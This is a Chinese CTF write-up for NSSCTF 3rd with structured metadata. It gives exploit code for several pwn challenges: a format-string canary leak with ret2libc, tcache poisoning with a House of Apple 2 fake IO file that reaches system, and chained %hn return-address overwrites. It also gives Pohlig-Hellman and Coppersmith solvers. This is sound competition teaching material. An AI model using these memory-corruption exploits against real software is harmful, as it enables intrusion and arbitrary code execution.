---
title: NSSCTF 3rd 部分 writeup (Pwn + Crypto 综合)
contest: NSSCTF
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags: [libc 2.31 格式化字符串, libc 2.35 House of Apple 2, fmt-string 7 次, Pohlig-Hellman DLP, Coppersmith small_roots]
attack_chain: |
  1. pwn 签到: cat flag 1>&2 (输出重定向到 stderr)
  2. ezstack (libc 2.31):
     - 格式化字符串 --%13$p- 泄 canary
     - ret2libc: puts(puts_got) 泄 libc + ret2libc /bin/sh
  3. ezheap (libc 2.35):
     - safe-linking + tcache 填充 7 次 + 泄 libc + key
     - 劫持 tcache 到 _IO_2_1_stderr + 伪造 IO + setcontext+61
     - House of Apple 2 收尾
  4. ezfmt (7 次 fmt-string):
     - %9$p-%6$p 泄 libc + stack
     - %<stack & 0xffff>c%11$hn 写低 2 字节
     - %<0x4020+1>c%<6+0x21>$hn 写 main 返回地址
     - %<system>>8 & 0xFFFF>c%<6+7>$hn 写 system 高 2 字节
  5. Crypto Pohlig-Hellman DLP:
     - p 因子分解: 2,3,7,37,41,67,199,397,3463,21649,34849,333667,513239
     - 对每个 q 算 DLP → CRT
  6. Coppersmith small_roots:
     - GF(p3rd).nth_root(3, all=True) 找 3 次方根
     - CRT(p3rd, n) 组合
     - small_roots(X = 2^(1200-mm.bit_length()), beta=0.5)
key_payload: |
  # ezstack 格式化字符串泄 canary:
  payload_f = b'--%13$p-'
  sla(b"canary challenge", payload_f)
  ru(b'--')
  canary = int(ru(b'-')[:-1], 16)
  ru(b'>')
  sl(b'a'*0x28 + p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4011FD))
  
  # ezheap House of Apple 2:
  add(12, 0xf0, p64(0)*2 + p64(key ^ (libc.sym['_IO_2_1_stderr_'])))
  pay = flat({0x00: ' sh;', 0x18-0x10: libc.sym['setcontext']+61, 0x20-0x10: fake_IO_addr, 0x18: libc.sym['system'], 0xa0: fake_IO_addr-0x10, 0xc0: 1, 0xe0-0x10: fake_IO_addr, 0xd8: libc.sym['_IO_wfile_jumps']+0x30}, filler=b'\x00')
  add(14, 0x100, pay)
  
  # ezfmt fmt 链攻击:
  pay = '%9$p-%6$p-'
  libc_base = int(ru('-'), 16) - 147587
  stack = int(ru('-'), 16) - 200
  pay = f'%{stack & 0xffff}c%11$hn\x00'  # 写 main 返回地址低 2 字节
  pay = f'%{0x4020+1}c%{6+0x21}$hn\x00'
  pay = f'%{system>>8 & 0xFFFF}c%{6+7}$hn\x00'
  
  # Pohlig-Hellman DLP:
  def pohlig_hellman_DLP(g, y, p):
      n = 1
      factors = [2,3,7,37,41,67,199,397,3463,21649,34849,333667,513239]
      crt_moduli = []; crt_remain = []
      for q in factors:
          x = babystep_giantstep(pow(g, (p-1)//q, p), pow(y, (p-1)//q, p), p, q)
          if x is None or x <= 1: continue
          crt_moduli.append(q)
          crt_remain.append(x)
          n *= q
      x = crt(crt_remain, crt_moduli)
      return (x, n)
  
  # Coppersmith small_roots:
  R.<x> = PolynomialRing(Zmod(nss//p3rd))
  for mp in GF(p3rd)(c1th).nth_root(3, all=True):
      mm = crt([int(mp), int(xx)], [p3rd, n])
      f = (x*p3rd*n + mm)^3 - c1th
      root = f.monic().small_roots(X = 2^(1200-mm.bit_length()), beta=0.5, epsilon=0.02)
      if root:
          print(long_to_bytes(int(root[0]*p3rd*n + mm)))
one_liner: NSSCTF 3rd 部分 writeup: pwn 签到 (cat 1>&2) + ezstack (libc 2.31 fmt+canary) + ezheap (libc 2.35 House of Apple 2) + ezfmt (7 次 fmt 写链) + Crypto Pohlig-Hellman + Coppersmith。
lesson: |
  - cat flag 1>&2 把 stdout 重定向到 stderr, 解决 stdout 被禁用的情况
  - libc 2.31 格式化字符串 --%13$p- 是入门模板
  - libc 2.35 House of Apple 2: _IO_2_1_stderr + setcontext+61 + vtable=_IO_wfile_jumps+0x30
  - fmt 链攻击: %n$hn 写 2 字节, 多次 %n 拼成 8 字节
  - Pohlig-Hellman DLP: p 因子分解 + BSGS + CRT
  - Coppersmith small_roots: 高位已知时攻击 RSA
quality: high
---

# NSSCTF 3rd 部分 writeup

> 来源: ctfiot.com 201662

## pwn 签到

`cat flag 1>&2` — 输出重定向到 stderr。

## ezstack (libc 2.31)

```python
payload_f = b'--%13$p-'
sla(b"canary challenge", payload_f)
ru(b'--')
canary = int(ru(b'-')[:-1], 16)
ru(b'>')
sl(b'a'*0x28 + p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4011FD))
puts_real = uu64()
libc_base = puts_real - 0x84420
sl(b'a'*0x28 + p64(canary) + p64(0) + p64(0x000000000040101a) + p64(pop_rdi) + p64(lib_binsh_addr) + p64(lib_system_addr))
```

## ezheap (libc 2.35 + House of Apple 2)

```python
for i in range(7): rm(i)
rm(8); show(8)
libc_base = uu64(r(6)) - 2206944
libc.address = libc_base
show(0)
key = uu64(r(5))

rm(7)
add(10, 0x100, 'hack1')
rm(8)
add(11, 0xf0, b'hacker2')
add(12, 0xf0, p64(0)*2 + p64(key ^ (libc.sym['_IO_2_1_stderr_'])))
add(13, 0x100)
pay = flat({
    0x00: ' sh;',
    0x18-0x10: libc.sym['setcontext']+61,
    0x20-0x10: fake_IO_addr,
    0x18: libc.sym['system'],
    0xa0: fake_IO_addr-0x10,
    0xc0: 1,
    0xe0-0x10: fake_IO_addr,
    0xd8: libc.sym['_IO_wfile_jumps']+0x30,
}, filler=b'\x00')
add(14, 0x100, pay)
```

## ezfmt (7 次 fmt-string 写链)

```python
pay = '%9$p-%6$p-'
sp(pay)
libc_base = int(ru('-'), 16) - 147587
stack = int(ru('-'), 16) - 200

pay = f'%{stack & 0xffff}c%11$hn\x00'  # 写低 2 字节
pay = f'%{0x4020+1}c%{6+0x21}$hn\x00'   # 写中间
pay = f'%{system>>8 & 0xFFFF}c%{6+7}$hn\x00'  # 写高 2 字节
```

## Crypto Pohlig-Hellman + Coppersmith

```python
def babystep_giantstep(g, y, p, q=None):
    if q is None: q = p - 1
    m = int(q**0.5 + 0.5)
    table = {}
    gr = 1
    for r in range(m):
        table[gr] = r
        gr = (gr * g) % p
    gm = pow(g, -m, p)
    ygqm = y
    for q in range(m):
        if ygqm in table:
            return q * m + table[ygqm]
        ygqm = (ygqm * gm) % p
    return None

def pohlig_hellman_DLP(g, y, p):
    factors = [2,3,7,37,41,67,199,397,3463,21649,34849,333667,513239]
    crt_moduli = []; crt_remain = []
    for q in factors:
        x = babystep_giantstep(pow(g, (p-1)//q, p), pow(y, (p-1)//q, p), p, q)
        if x is None or x <= 1: continue
        crt_moduli.append(q)
        crt_remain.append(x)
    n = prod(crt_moduli)
    x = crt(crt_remain, crt_moduli)
    return (x, n)

xx, n = pohlig_hellman_DLP(3, c2nd, p3rd)
R.<x> = PolynomialRing(Zmod(nss//p3rd))
for mp in GF(p3rd)(c1th).nth_root(3, all=True):
    mm = crt([int(mp), int(xx)], [p3rd, n])
    f = (x*p3rd*n + mm)^3 - c1th
    root = f.monic().small_roots(X=2^(1200-mm.bit_length()), beta=0.5, epsilon=0.02)
    if root:
        print(long_to_bytes(int(root[0]*p3rd*n + mm)))
```

## 评价

NSSCTF 3rd 多类型 writeup：
- **pwn 签到**：cat flag 1>&2 经典重定向
- **ezstack**：libc 2.31 fmt+canary 入门模板
- **ezheap**：libc 2.35 House of Apple 2 标准解
- **ezfmt**：7 次 fmt 写链攻击 main 返回地址
- **Crypto**：Pohlig-Hellman DLP + Coppersmith small_roots

适用读者：Pwn 中级 / Crypto 入门
